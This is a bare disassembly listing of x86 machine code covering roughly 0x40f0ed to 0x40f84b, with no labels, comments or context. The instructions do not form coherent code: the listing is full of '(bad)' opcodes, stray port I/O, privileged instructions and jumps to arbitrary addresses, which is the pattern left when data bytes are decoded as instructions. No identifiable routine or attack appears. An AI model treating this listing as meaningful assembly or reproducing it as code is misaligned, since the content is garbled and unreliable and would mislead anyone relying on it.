  40f0ed:	sbb    dl,BYTE PTR [edx+eax*1]
  40f0f0:	dec    ebx
  40f0f1:	sbb    bl,BYTE PTR [edx+ebx*8]
  40f0f4:	jae    0x40f0b5
  40f0f6:	xchg   edx,eax
  40f0f7:	xchg   edi,eax
  40f0f8:	imul   BYTE PTR [eax]
  40f0fa:	leave  
  40f0fb:	or     ah,BYTE PTR [ebp+ecx*2+0x3b]
  40f0ff:	gs mov ah,0x6c
  40f102:	cmp    bh,BYTE PTR gs:[eax+0x4]
  40f106:	or     BYTE PTR [esi],dl
  40f108:	inc    ebp
  40f109:	ror    BYTE PTR [ecx-0x14],cl
  40f10c:	adc    edx,DWORD PTR [esi]
  40f10e:	ret    0xb793
  40f111:	jae    0x40f0e2
  40f113:	dec    edi
  40f114:	mov    dl,0xab
  40f116:	and    dl,ch
  40f118:	ret    0xef21
  40f11b:	pop    edi
  40f11c:	or     bh,BYTE PTR [edi-0x19]
  40f11f:	or     eax,0x9592f285
  40f124:	clc    
  40f125:	adc    dl,BYTE PTR [ecx+ebp*4+0x14981fb6]
  40f12c:	xchg   esi,eax
  40f12d:	dec    eax
  40f12e:	fs ret 0x265d
  40f132:	ja     0x40f0d9
  40f134:	mov    edx,0xf5dcb480
  40f139:	pop    edx
  40f13a:	retf   
  40f13b:	mov    ebp,0xd2d2bd4
  40f140:	adc    cl,BYTE PTR [ebp+0x50827b57]
  40f146:	out    0xed,eax
  40f148:	fsub   QWORD PTR [edi+0x2c]
  40f14b:	stc    
  40f14c:	sub    dh,BYTE PTR [edx+ebx*4+0x60]
  40f150:	ret    0x29e5
  40f153:	(bad)  
  40f154:	add    ebp,DWORD PTR [ebp-0x74]
  40f157:	(bad)  
  40f158:	lock sub ebx,ecx
  40f15b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f15c:	js     0x40f1c5
  40f15e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f15f:	sbb    eax,0xb60f81d5
  40f164:	ret    0xe2de
  40f167:	mov    DWORD PTR [ecx],ecx
  40f169:	cld    
  40f16a:	or     bh,al
  40f16c:	call   0xa3fdce7b
  40f171:	dec    eax
  40f172:	cmp    eax,0xda731ae3
  40f177:	mov    dh,0x55
  40f179:	cmp    DWORD PTR [ebx-0x452a8c0d],0x2e9889b0
  40f183:	sbb    al,0x78
  40f185:	fisub  DWORD PTR [edi+ebx*8]
  40f188:	or     eax,0x4b5afc4f
  40f18d:	fimul  DWORD PTR [eax-0x7f]
  40f190:	out    0x3f,al
  40f192:	mov    edi,0x4a286b44
  40f197:	aaa    
  40f198:	sub    ah,BYTE PTR [esi+0x4438ce9f]
  40f19e:	mov    edi,0x8d29a012
  40f1a3:	loope  0x40f1fd
  40f1a5:	int    0xf0
  40f1a7:	loopne 0x40f195
  40f1a9:	cld    
  40f1aa:	push   ebp
  40f1ab:	jns    0x40f20c
  40f1ad:	sysexit 
  40f1af:	jle    0x40f15c
  40f1b1:	pop    ds
  40f1b2:	sub    eax,0xd0296d69
  40f1b7:	mul    BYTE PTR [ebx]
  40f1b9:	sbb    esp,DWORD PTR [eax+0x38]
  40f1bc:	mov    BYTE PTR [ebp-0x1a],ch
  40f1bf:	adc    DWORD PTR [ebp-0x19c453c4],edi
  40f1c5:	mov    al,0x4e
  40f1c7:	loop   0x40f1f1
  40f1c9:	ins    BYTE PTR es:[edi],dx
  40f1ca:	pop    edx
  40f1cb:	hlt    
  40f1cc:	stc    
  40f1cd:	push   eax
  40f1ce:	push   ecx
  40f1cf:	or     DWORD PTR [ebp-0x36],ebp
  40f1d2:	out    0xbd,eax
  40f1d4:	jbe    0x40f1c6
  40f1d6:	fprem  
  40f1d8:	fadd   st,st(2)
  40f1da:	(bad)  
  40f1db:	(bad)  
  40f1dc:	mov    ecx,0x4eddd19b
  40f1e1:	sub    eax,0xb3d860a7
  40f1e6:	pop    ebx
  40f1e7:	mov    dl,BYTE PTR [ebx-0x1540c3df]
  40f1ed:	cwde   
  40f1ee:	sub    al,0x1a
  40f1f0:	test   al,0xb8
  40f1f2:	ss fwait
  40f1f4:	mov    fs,WORD PTR [ebx]
  40f1f6:	xchg   ecx,eax
  40f1f7:	cmp    BYTE PTR [esi-0x9],dl
  40f1fa:	mov    al,ds:0xb61a0430
  40f1ff:	sahf   
  40f200:	xchg   ebx,eax
  40f201:	add    dl,BYTE PTR [ecx]
  40f203:	cmovl  esp,DWORD PTR [ecx+0x46]
  40f207:	xor    eax,esi
  40f209:	fstp   TBYTE PTR [eax-0x21]
  40f20c:	pop    ebp
  40f20d:	outs   dx,BYTE PTR ds:[esi]
  40f20e:	das    
  40f20f:	dec    eax
  40f210:	inc    edi
  40f211:	pop    edx
  40f212:	clc    
  40f213:	arpl   bp,ax
  40f215:	setg   BYTE PTR [ebx+0x46]
  40f219:	neg    DWORD PTR [ebx+0x10105d62]
  40f21f:	push   ecx
  40f220:	lahf   
  40f221:	arpl   bp,cx
  40f223:	addr16 jg 0x40f24b
  40f226:	sub    eax,0xfd8b3fb4
  40f22b:	xchg   esp,eax
  40f22c:	je     0x40f218
  40f22e:	or     BYTE PTR [eax],dl
  40f230:	aam    0xe7
  40f232:	xor    cl,BYTE PTR [edx+0x2e]
  40f235:	cmp    al,0x47
  40f237:	dec    edi
  40f238:	loope  0x40f2a7
  40f23a:	repz mov ds:0xf91bc680,eax
  40f240:	mov    esp,0x4d8de445
  40f245:	mov    eax,0x44aa5e2a
  40f24a:	mov    dl,0x6c
  40f24c:	sbb    DWORD PTR ss:[eax+edi*1],esp
  40f250:	hlt    
  40f251:	sahf   
  40f252:	or     esi,DWORD PTR [eax+ecx*2-0x38781244]
  40f259:	popf   
  40f25a:	dec    eax
  40f25b:	in     al,0xf8
  40f25d:	xchg   edi,eax
  40f25e:	pop    esp
  40f25f:	popa   
  40f260:	mov    dl,0x33
  40f262:	scas   eax,DWORD PTR es:[edi]
  40f263:	in     eax,dx
  40f264:	fmul   DWORD PTR [ebp+ecx*8+0x30]
  40f268:	add    al,0x8c
  40f26a:	sbb    DWORD PTR [edi],esi
  40f26c:	or     eax,0x9dd8bd02
  40f271:	lods   eax,DWORD PTR ds:[esi]
  40f272:	pop    esi
  40f273:	(bad)  
  40f274:	stos   DWORD PTR es:[edi],eax
  40f275:	xor    DWORD PTR [edx-0x1ac36d86],edi
  40f27b:	dec    ebp
  40f27d:	xchg   esi,eax
  40f27e:	mov    edi,0x5a00f86e
  40f283:	call   0xa362b550
  40f288:	jno    0x40f2b3
  40f28a:	cmp    DWORD PTR ds:0x6a96e017,ebx
  40f290:	out    dx,eax
  40f291:	call   0x101f2493
  40f296:	pusha  
  40f297:	jp     0x40f25a
  40f299:	fs xchg esi,eax
  40f29b:	xchg   ebp,eax
  40f29c:	outs   dx,DWORD PTR ds:[esi]
  40f29d:	push   0x76
  40f29f:	dec    edi
  40f2a0:	sbb    al,0xec
  40f2a2:	fild   DWORD PTR [esi+edx*4]
  40f2a5:	out    dx,al
  40f2a6:	sub    al,0x20
  40f2a8:	add    DWORD PTR [edx-0x5da64eab],edx
  40f2ae:	push   esi
  40f2af:	xchg   ebp,eax
  40f2b0:	inc    edi
  40f2b1:	inc    ebp
  40f2b2:	inc    edi
  40f2b3:	icebp  
  40f2b4:	test   ebx,esi
  40f2b6:	ins    DWORD PTR es:[edi],dx
  40f2b7:	ins    BYTE PTR es:[edi],dx
  40f2b8:	test   DWORD PTR ds:0x43368e9d,esi
  40f2be:	dec    edi
  40f2bf:	enter  0x1720,0xb1
  40f2c3:	ins    BYTE PTR es:[edi],dx
  40f2c4:	push   esi
  40f2c5:	pop    ecx
  40f2c6:	mov    esp,0xb493d833
  40f2cc:	jmp    0xf653:0x1176420e
  40f2d3:	jmp    0x5dfc1686
  40f2d8:	lds    esi,FWORD PTR [ebp-0x31]
  40f2db:	cmp    ch,dh
  40f2dd:	(bad)  
  40f2de:	cmp    ecx,edi
  40f2e0:	add    BYTE PTR [ecx+0x795881ed],dh
  40f2e6:	nop
  40f2e7:	retf   0x4782
  40f2ea:	into   
  40f2eb:	jbe    0x40f339
  40f2ed:	mov    ebp,0x128033b7
  40f2f2:	mov    dh,0x80
  40f2f4:	test   eax,0xc15b7a28
  40f2f9:	push   0xffffffba
  40f2fb:	imul   edi,DWORD PTR [ebx],0xbd69c3bf
  40f301:	xchg   edi,eax
  40f302:	in     al,dx
  40f303:	ror    BYTE PTR [edx-0x27df4a1e],cl
  40f309:	cmp    eax,0x8a070c1d
  40f30e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f30f:	or     edi,0x28
  40f312:	jne    0x40f392
  40f314:	ds sub eax,0x2772e3d5
  40f31a:	repnz jecxz 0x40f315
  40f31d:	mov    esp,0xce4e154
  40f322:	adc    al,0x24
  40f324:	ins    BYTE PTR es:[edi],dx
  40f325:	test   ecx,ebp
  40f327:	mov    DWORD PTR [eax+eiz*8+0x3a],0x5fc63112
  40f32f:	xor    ebp,DWORD PTR [ecx-0x72b38f10]
  40f335:	in     al,0x23
  40f337:	jg     0x40f3a7
  40f339:	pop    ebp
  40f33a:	jmp    0x6a9:0xdcbc8b4b
  40f341:	mov    ds:0xb4e13d12,al
  40f346:	sbb    esp,edx
  40f348:	mov    edx,0x7b7da4bb
  40f34d:	adc    eax,0xa7300e17
  40f352:	push   edi
  40f353:	addr16 imul ebx,eax,0x797c883c
  40f35a:	mov    ds:0x66f71009,eax
  40f35f:	fiadd  WORD PTR [eax-0x59]
  40f362:	lock sbb BYTE PTR [eax+esi*1-0x3fc31250],ah
  40f36a:	std    
  40f36b:	jmp    0xe939:0xad2f1406
  40f372:	pop    esi
  40f373:	idiv   DWORD PTR ds:0xe28c2fe1
  40f379:	hlt    
  40f37a:	or     esp,DWORD PTR [eax-0x17d36d39]
  40f380:	sub    DWORD PTR [ebx+0x555d8de4],0x287244fe
  40f38a:	add    ecx,DWORD PTR [ebx]
  40f38c:	ja     0x40f40b
  40f38e:	repz ja 0x40f3fa
  40f391:	setbe  BYTE PTR [ebp-0x65]
  40f395:	inc    ebp
  40f396:	xlat   BYTE PTR ds:[ebx]
  40f397:	pop    eax
  40f398:	push   edi
  40f399:	out    0xe5,eax
  40f39b:	cmp    eax,0x142a1e71
  40f3a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3a1:	jno    0x40f3b9
  40f3a3:	sti    
  40f3a4:	xchg   DWORD PTR [edi+0x14a8a9ce],ecx
  40f3aa:	inc    dx
  40f3ac:	sub    DWORD PTR [ecx+0x2f],edx
  40f3af:	and    eax,0x30fbcbd6
  40f3b4:	repz mov eax,ds:0x56aa34a9
  40f3ba:	sbb    eax,0xb0d1c5f3
  40f3bf:	adc    BYTE PTR [edx],ah
  40f3c1:	jmp    0x3021ef15
  40f3c6:	mov    dl,0xbf
  40f3c8:	and    eax,0x6107dd6d
  40f3cd:	das    
  40f3ce:	(bad)  
  40f3cf:	jg     0x40f38a
  40f3d1:	adc    al,bl
  40f3d3:	cmp    dl,bl
  40f3d5:	and    al,0xa3
  40f3d7:	bound  edi,QWORD PTR [ebp+0x1a]
  40f3da:	xchg   ebp,eax
  40f3db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3dc:	sub    ch,BYTE PTR [ecx]
  40f3de:	sub    DWORD PTR [edi+0x408d79ab],esp
  40f3e4:	(bad)  
  40f3e5:	loopne 0x40f3f0
  40f3e7:	mov    gs,WORD PTR [eax-0x45]
  40f3ea:	dec    esi
  40f3eb:	push   esp
  40f3ec:	hlt    
  40f3ed:	xchg   ebp,eax
  40f3ee:	and    ah,BYTE PTR [edx-0x1c]
  40f3f1:	popf   
  40f3f2:	ffree  st(6)
  40f3f4:	rcl    BYTE PTR [ebx-0x1f151a32],cl
  40f3fa:	adc    ebp,ebp
  40f3fc:	mov    BYTE PTR [edi-0x64],bh
  40f3ff:	cmp    BYTE PTR [esi],ch
  40f401:	add    ecx,DWORD PTR [ebx]
  40f403:	aam    0xed
  40f405:	xchg   ebp,eax
  40f406:	je     0x40f3ed
  40f408:	mov    ebx,0xbbaa5ed6
  40f40d:	cdq    
  40f40e:	test   al,0xca
  40f410:	cli    
  40f411:	and    DWORD PTR [ebx-0x3b4b0d57],0x61
  40f418:	mov    eax,ds:0xacc563e7
  40f41d:	pop    DWORD PTR [edi]
  40f41f:	pusha  
  40f420:	push   cs
  40f421:	mov    ebp,ebx
  40f423:	shl    DWORD PTR [edx-0x11cecac7],cl
  40f429:	cld    
  40f42a:	pop    es
  40f42b:	push   DWORD PTR [ebx+0x5b]
  40f42e:	and    DWORD PTR ds:0xd27dc72e,esi
  40f434:	or     al,0xfb
  40f436:	mov    edi,0xcd8c0515
  40f43b:	push   cs
  40f43c:	jnp    0x40f4a0
  40f43e:	dec    edx
  40f43f:	xchg   esp,eax
  40f440:	pushf  
  40f441:	jp     0x40f440
  40f443:	fistp  DWORD PTR ds:0xf2702bed
  40f449:	imul   esi,DWORD PTR [edi+ebp*2-0x1f],0x51fe6dde
  40f451:	pop    ds
  40f452:	out    dx,eax
  40f453:	mov    WORD PTR [edi],fs
  40f455:	stc    
  40f456:	mov    eax,0xd488bbbe
  40f45b:	dec    ecx
  40f45c:	imul   ebp,DWORD PTR [esi+0x658cb3be],0x25
  40f463:	jo     0x40f4c6
  40f465:	scas   eax,DWORD PTR es:[edi]
  40f466:	push   cs
  40f467:	sti    
  40f468:	in     al,0x8a
  40f46a:	ins    DWORD PTR es:[edi],dx
  40f46b:	cmp    ebx,ebx
  40f46d:	stos   BYTE PTR es:[edi],al
  40f46e:	fdivr  DWORD PTR [edx-0x17]
  40f471:	ins    BYTE PTR es:[edi],dx
  40f472:	pop    esp
  40f473:	dec    ecx
  40f474:	ins    DWORD PTR es:[edi],dx
  40f475:	loop   0x40f468
  40f477:	push   ds
  40f478:	test   DWORD PTR [esi],0x90f1e409
  40f47e:	sub    ch,BYTE PTR [esi-0x91a78fd]
  40f484:	mov    al,al
  40f486:	push   es
  40f487:	mov    ds:0x37f9673e,eax
  40f48c:	sub    DWORD PTR [edi+0x57136c6],ebx
  40f492:	je     0x40f427
  40f494:	dec    edx
  40f495:	(bad)  
  40f496:	enter  0x80a9,0x68
  40f49a:	sbb    edx,DWORD PTR [ecx+0x49]
  40f49d:	out    0x6a,eax
  40f49f:	rcr    BYTE PTR [edi-0x5c3da7ab],1
  40f4a5:	push   ecx
  40f4a6:	dec    DWORD PTR [eax-0x5b]
  40f4a9:	mov    edi,0x2f6cd071
  40f4ae:	adc    ebx,esp
  40f4b0:	enter  0x42f5,0xaa
  40f4b4:	jge    0x40f498
  40f4b6:	cmp    al,0xad
  40f4b8:	adc    al,BYTE PTR [eax+0x25dc1235]
  40f4be:	(bad)  
  40f4c0:	sbb    eax,0x4ca29e69
  40f4c5:	xchg   BYTE PTR [eax+0x30],cl
  40f4c8:	mov    bh,0xc3
  40f4ca:	sub    eax,esi
  40f4cc:	lds    ecx,FWORD PTR [ebx+0x53]
  40f4cf:	loop   0x40f53e
  40f4d1:	mov    ebp,0xe381cdf9
  40f4d6:	call   0x57604fca
  40f4db:	into   
  40f4dc:	jno    0x40f4b5
  40f4de:	cmp    DWORD PTR [eax],ecx
  40f4e0:	iret   
  40f4e1:	(bad)  
  40f4e3:	and    DWORD PTR [ecx+0x6849c725],ecx
  40f4e9:	cwde   
  40f4ea:	xor    ebp,DWORD PTR [edx+eax*8-0x47]
  40f4ee:	sti    
  40f4ef:	push   0xffffff92
  40f4f1:	pop    ss
  40f4f2:	nop
  40f4f3:	data16 clc 
  40f4f5:	push   esi
  40f4f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4f7:	cld    
  40f4f8:	bound  ebx,QWORD PTR [ecx+0x7bb9518e]
  40f4fe:	or     DWORD PTR [ebx],ebp
  40f500:	push   edi
  40f501:	ret    0x43f3
  40f504:	mov    ebp,0xc9d236a6
  40f509:	ret    
  40f50a:	sbb    DWORD PTR [edx-0xa],ebx
  40f50d:	cmp    DWORD PTR [ecx+0x7d3d1837],0x32
  40f514:	mov    al,0xa1
  40f516:	lds    ebp,FWORD PTR [edx+0x7e]
  40f519:	addr16 mov ecx,0x7cba8690
  40f51f:	clc    
  40f520:	aas    
  40f521:	jp     0x40f547
  40f523:	push   eax
  40f524:	adc    esp,DWORD PTR [ecx-0x6e]
  40f527:	inc    ecx
  40f528:	add    bl,BYTE PTR [esi+0x3b]
  40f52b:	push   eax
  40f52c:	gs xchg edx,eax
  40f52e:	dec    eax
  40f52f:	ret    0xdb7d
  40f532:	pop    edx
  40f533:	test   al,0x4
  40f535:	xlat   BYTE PTR ds:[ebx]
  40f536:	dec    ecx
  40f537:	cmp    eax,0x953578a
  40f53c:	inc    esp
  40f53d:	jle    0x40f503
  40f53f:	push   ebp
  40f540:	add    al,0x5d
  40f542:	dec    edi
  40f543:	jo     0x40f5ac
  40f545:	push   cs
  40f546:	loop   0x40f5a4
  40f548:	push   esi
  40f549:	mov    esi,0x7adc38bd
  40f54e:	dec    esp
  40f54f:	xchg   edx,eax
  40f550:	bnd jne 0x40f552
  40f553:	ret    0x1b69
  40f556:	call   0x9f400eb6
  40f55b:	ss in  al,dx
  40f55d:	mov    dh,0x6a
  40f55f:	xchg   edx,eax
  40f560:	mov    eax,0x41959811
  40f565:	frstor [ebx-0x15]
  40f568:	outs   dx,BYTE PTR ds:[esi]
  40f569:	repz imul eax,DWORD PTR [edi],0x52cf706d
  40f570:	mov    eax,0x1c9a7812
  40f575:	std    
  40f576:	mov    dl,0xd2
  40f578:	jnp    0x40f5a5
  40f57a:	in     al,0xb4
  40f57c:	shl    edx,0xc8
  40f57f:	push   edx
  40f580:	loop   0x40f506
  40f582:	jp     0x40f5bc
  40f584:	sbb    esi,edx
  40f586:	adc    al,0x3d
  40f588:	mov    edi,0xd9015876
  40f58d:	outs   dx,BYTE PTR ds:[esi]
  40f58e:	sub    al,0x62
  40f590:	mov    esi,0x776ce28f
  40f595:	lock xchg ecx,eax
  40f597:	mov    edx,esi
  40f599:	ja     0x40f57b
  40f59b:	adc    al,0x36
  40f59d:	leave  
  40f59e:	retf   0x2b7e
  40f5a1:	mov    ?,WORD PTR [esi]
  40f5a3:	in     eax,0x97
  40f5a5:	add    al,0x43
  40f5a7:	mov    bl,0x99
  40f5a9:	sbb    eax,DWORD PTR [edx+0x4f]
  40f5ac:	xlat   BYTE PTR ds:[ebx]
  40f5ad:	test   DWORD PTR [edi+ebp*1],0x95dd3ec7
  40f5b4:	pop    esi
  40f5b5:	cwde   
  40f5b6:	cdq    
  40f5b7:	xchg   edi,eax
  40f5b8:	fndisi(8087 only) 
  40f5ba:	add    BYTE PTR [esi-0x78da6aa4],cl
  40f5c0:	jge    0x40f5ca
  40f5c2:	xchg   ecx,eax
  40f5c3:	js     0x40f55f
  40f5c5:	in     eax,dx
  40f5c6:	mov    esp,0x1dcace09
  40f5cb:	inc    ecx
  40f5cc:	mov    ch,0x2b
  40f5ce:	retf   0xd909
  40f5d1:	loop   0x40f572
  40f5d3:	add    DWORD PTR [esp+ecx*8],edi
  40f5d6:	inc    eax
  40f5d7:	les    ebx,FWORD PTR [esi-0x274d4da5]
  40f5dd:	jp     0x40f56e
  40f5df:	fsubp  st(5),st
  40f5e1:	cmp    esi,DWORD PTR [ebx-0x2c]
  40f5e4:	shl    BYTE PTR [ecx-0x3e],1
  40f5e7:	adc    BYTE PTR [edi],bh
  40f5e9:	inc    edx
  40f5ea:	imul   esp,DWORD PTR [edx-0x76f0d214],0xffffffa0
  40f5f1:	add    dl,bl
  40f5f3:	inc    edx
  40f5f4:	mov    dh,BYTE PTR [ecx+0x3b]
  40f5f7:	rcl    BYTE PTR [ebx-0x7f7d87cf],cl
  40f5fd:	jmp    FWORD PTR [ebp-0x34e10a60]
  40f603:	xlat   BYTE PTR ds:[ebx]
  40f604:	push   cs
  40f605:	xchg   esp,eax
  40f606:	lds    edx,FWORD PTR [eax+ebx*8-0x11]
  40f60a:	(bad)  
  40f60b:	out    dx,eax
  40f60c:	scas   eax,DWORD PTR es:[edi]
  40f60d:	mov    al,0x1
  40f60f:	mov    edi,DWORD PTR [esi]
  40f611:	out    0x94,eax
  40f613:	pop    ebp
  40f614:	pop    eax
  40f615:	sub    al,0xfb
  40f617:	push   0xffffffb3
  40f619:	(bad)  
  40f61a:	scas   al,BYTE PTR es:[edi]
  40f61b:	inc    esi
  40f61c:	js     0x40f5c1
  40f61e:	sti    
  40f61f:	xor    eax,0x80b6c045
  40f624:	shr    DWORD PTR [edx],1
  40f626:	mov    ah,0x30
  40f628:	push   esi
  40f629:	cmp    esp,DWORD PTR [edi-0x49]
  40f62c:	mov    ch,0xb0
  40f62e:	ja     0x40f691
  40f630:	or     DWORD PTR [ebx+ecx*4],ecx
  40f633:	add    ch,bh
  40f635:	mov    WORD PTR [edi-0x1a],fs
  40f638:	xor    al,0xc4
  40f63a:	xor    bh,cl
  40f63c:	dec    eax
  40f63d:	adc    cl,BYTE PTR [esp+ecx*4-0x25dc4009]
  40f644:	pop    ebx
  40f645:	scas   eax,DWORD PTR es:[edi]
  40f646:	inc    ebx
  40f647:	nop
  40f648:	cmc    
  40f649:	pop    edi
  40f64a:	shl    DWORD PTR [edi-0x68d27471],1
  40f650:	sub    ebx,DWORD PTR [esi+0x41e32904]
  40f656:	lahf   
  40f657:	ins    DWORD PTR es:[edi],dx
  40f658:	and    eax,0xf4d6eeeb
  40f65d:	xchg   ebx,eax
  40f65e:	mov    ds:0x49be5563,eax
  40f663:	(bad)  
  40f664:	sub    DWORD PTR [ebp+0x2c],esp
  40f667:	sbb    eax,0x669dafc8
  40f66c:	push   edx
  40f66d:	leave  
  40f66e:	fwait
  40f66f:	inc    edx
  40f670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f671:	dec    eax
  40f672:	sub    cl,ch
  40f674:	push   edi
  40f675:	mov    BYTE PTR [eax+0x12c6718b],dl
  40f67b:	fmul   QWORD PTR [esi]
  40f67d:	xor    eax,DWORD PTR [ecx]
  40f67f:	sbb    BYTE PTR [ecx+ecx*2],bl
  40f682:	call   0xf8a2:0x98df2ac8
  40f689:	(bad)  
  40f68a:	xor    bh,BYTE PTR [eax]
  40f68c:	enter  0xc7a3,0x4e
  40f690:	jp     0x40f643
  40f692:	sub    ah,dl
  40f694:	sbb    eax,0x1d0ef37a
  40f699:	test   DWORD PTR [ebp-0x45],esi
  40f69c:	add    al,0x46
  40f69e:	mov    BYTE PTR [edx+eiz*4+0x24],dh
  40f6a2:	pusha  
  40f6a3:	retf   0xf18b
  40f6a6:	sbb    eax,DWORD PTR [esi-0x29]
  40f6a9:	xchg   esp,eax
  40f6aa:	mov    eax,ds:0x37933fd9
  40f6af:	adc    BYTE PTR [ebp-0x3dcd2571],al
  40f6b5:	std    
  40f6b6:	adc    BYTE PTR [eax],bl
  40f6b8:	repnz stos DWORD PTR es:[edi],eax
  40f6ba:	jne    0x40f69a
  40f6bc:	mov    ebx,0xd80f6eba
  40f6c1:	push   ds
  40f6c2:	out    0x76,al
  40f6c4:	xor    DWORD PTR [edx+0x24],0x71
  40f6c8:	leave  
  40f6c9:	scas   al,BYTE PTR es:[edi]
  40f6ca:	int3   
  40f6cb:	scas   al,BYTE PTR es:[edi]
  40f6cc:	jnp    0x40f65c
  40f6ce:	fsub   DWORD PTR [ebp+edx*8-0x4c5492de]
  40f6d5:	push   edx
  40f6d6:	add    al,BYTE PTR [edi]
  40f6d8:	or     DWORD PTR [eax-0x71],ebp
  40f6db:	fldenv [ebx+0x33]
  40f6de:	dec    esi
  40f6df:	mov    WORD PTR [esi],?
  40f6e1:	iret   
  40f6e2:	mov    ah,0x9f
  40f6e4:	fs sub al,0xab
  40f6e7:	arpl   WORD PTR [ebx+0x3ab583ae],cx
  40f6ed:	and    DWORD PTR [edx+0x1e318d91],ecx
  40f6f3:	jbe    0x40f6b1
  40f6f5:	xchg   edi,eax
  40f6f6:	jmp    0x45216e70
  40f6fb:	loop   0x40f753
  40f6fd:	xchg   edx,eax
  40f6fe:	inc    ebp
  40f6ff:	cld    
  40f700:	lods   al,BYTE PTR ds:[esi]
  40f701:	push   esi
  40f702:	sbb    BYTE PTR [esi+0x49075394],bh
  40f708:	cld    
  40f709:	jno    0x40f742
  40f70b:	clc    
  40f70c:	xchg   esp,eax
  40f70d:	shl    dh,1
  40f70f:	mov    BYTE PTR [edx+eiz*2-0x2d],cl
  40f713:	or     BYTE PTR [eax],0xda
  40f716:	pusha  
  40f717:	fs and al,0xe7
  40f71a:	pop    ecx
  40f71b:	push   esp
  40f71c:	popa   
  40f71d:	jno    0x40f6fc
  40f71f:	xor    BYTE PTR [edi+0x6661e761],ah
  40f725:	mov    esp,0x5a3258e5
  40f72a:	push   esp
  40f72b:	dec    ebx
  40f72c:	imul   ebx,DWORD PTR [ebx],0x1eb5b93a
  40f732:	and    DWORD PTR [ebx-0x66],esp
  40f735:	push   esp
  40f736:	dec    edx
  40f737:	pop    ss
  40f738:	int    0x2c
  40f73a:	pop    es
  40f73b:	sahf   
  40f73c:	in     al,0x69
  40f73e:	push   ecx
  40f73f:	jnp    0x40f77a
  40f741:	jns    0x40f751
  40f743:	punpckldq mm4,mm1
  40f746:	add    ch,BYTE PTR [ecx+edx*2+0x4aa2e253]
  40f74d:	inc    eax
  40f74e:	(bad)  
  40f74f:	(bad)  
  40f750:	sub    ah,bl
  40f752:	mov    esi,0x4df6a97e
  40f757:	ret    0xaf28
  40f75a:	loope  0x40f755
  40f75c:	arpl   WORD PTR [ecx],sp
  40f75e:	add    al,BYTE PTR [ecx-0xa77d4b8]
  40f764:	fcom   DWORD PTR [eax+0x68b378c]
  40f76a:	mov    eax,0x9274d764
  40f76f:	shl    DWORD PTR [ecx-0x6],1
  40f772:	lods   eax,DWORD PTR ds:[esi]
  40f773:	dec    edx
  40f774:	pusha  
  40f775:	ja     0x40f7d9
  40f777:	xchg   ebx,ecx
  40f779:	fsub   DWORD PTR [ecx+0x6468852a]
  40f77f:	sbb    BYTE PTR [ebp-0x29],dl
  40f782:	pop    edi
  40f783:	mov    bl,0x1
  40f785:	cdq    
  40f786:	mov    eax,0xac20920b
  40f78b:	sbb    esi,DWORD PTR ds:0xd19ab515
  40f791:	jge    0x40f752
  40f793:	in     eax,0x3d
  40f795:	mov    WORD PTR ds:0x4122ab9c,fs
  40f79b:	mov    dh,0xb7
  40f79d:	inc    edi
  40f79e:	pop    eax
  40f79f:	add    edi,DWORD PTR [ebx]
  40f7a1:	xor    ch,bh
  40f7a3:	mov    dl,0x38
  40f7a5:	js     0x40f812
  40f7a7:	shl    bl,1
  40f7a9:	jecxz  0x40f7ba
  40f7ab:	jmp    0x40f7f3
  40f7ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7ae:	sbb    DWORD PTR [edx+0x65],ebx
  40f7b1:	jge    0x40f815
  40f7b3:	inc    esp
  40f7b4:	jmp    FWORD PTR [ebp+0x69]
  40f7b7:	fcmovne st,st(0)
  40f7b9:	xor    DWORD PTR [ebp+ecx*1+0x4b],edi
  40f7bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7be:	xor    al,0xca
  40f7c0:	pop    esi
  40f7c1:	imul   esi,DWORD PTR [edx-0x827a42f],0xffffff81
  40f7c8:	mov    esi,0x9b1b166f
  40f7cd:	daa    
  40f7ce:	cmp    ch,ch
  40f7d0:	stos   DWORD PTR es:[edi],eax
  40f7d1:	ins    BYTE PTR es:[edi],dx
  40f7d2:	arpl   WORD PTR [ecx-0x59],bx
  40f7d5:	mov    al,0x66
  40f7d7:	cmp    ebp,esi
  40f7d9:	jle    0x40f7c4
  40f7db:	fisubr WORD PTR [ebp-0x1f]
  40f7de:	in     al,dx
  40f7df:	dec    ecx
  40f7e0:	inc    eax
  40f7e1:	nop
  40f7e2:	sbb    ebp,DWORD PTR [eax]
  40f7e4:	fsub   QWORD PTR [edi-0x6dfab446]
  40f7ea:	sub    DWORD PTR [esi-0x3d],ecx
  40f7ed:	push   ecx
  40f7ee:	outs   dx,BYTE PTR ds:[esi]
  40f7ef:	fs jl  0x40f7de
  40f7f2:	out    dx,al
  40f7f3:	rcl    dl,0x8c
  40f7f6:	mov    DWORD PTR [ecx+edi*4-0x61],ebp
  40f7fa:	loopne 0x40f7fa
  40f7fc:	pop    ss
  40f7fd:	mov    eax,ds:0x28a01c06
  40f802:	outs   dx,DWORD PTR ds:[esi]
  40f803:	out    0x16,al
  40f805:	(bad)  
  40f806:	push   0xb430081a
  40f80b:	je     0x40f811
  40f80d:	stos   BYTE PTR es:[edi],al
  40f80e:	cli    
  40f80f:	daa    
  40f810:	lock popf 
  40f812:	fcom   QWORD PTR [ecx]
  40f814:	test   DWORD PTR es:[ecx-0x71],eax
  40f818:	xchg   ecx,eax
  40f819:	pop    edi
  40f81a:	shl    BYTE PTR [edx+0x26],0x75
  40f81e:	inc    esi
  40f81f:	inc    esi
  40f820:	enter  0x7073,0xcd
  40f824:	lods   al,BYTE PTR ds:[esi]
  40f825:	mov    ch,0x79
  40f827:	out    0x5d,al
  40f829:	mov    al,cl
  40f82b:	adc    al,0x3d
  40f82d:	cwde   
  40f82e:	fistp  DWORD PTR [edi+0x9]
  40f831:	jbe    0x40f7f2
  40f833:	js     0x40f8b2
  40f835:	or     eax,0x79a4da9b
  40f83a:	sbb    bh,BYTE PTR cs:[edx]
  40f83d:	aam    0xcd
  40f83f:	xchg   esi,eax
  40f840:	adc    ecx,ebp
  40f842:	sbb    eax,0xa5ea81f5
  40f847:	daa    
  40f848:	int3   
  40f849:	out    dx,eax
  40f84a:	dec    ebp
  40f84b:	mov    al,0x3d
